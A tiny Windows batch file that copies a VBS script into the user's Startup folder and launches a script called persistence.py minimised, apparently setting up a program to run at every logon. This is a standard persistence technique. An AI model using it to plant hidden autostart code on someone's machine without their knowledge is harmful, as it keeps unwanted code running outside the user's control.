@echo off
copy run_python_script.vbs "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"

start /min  C:\Python\python persistence.py

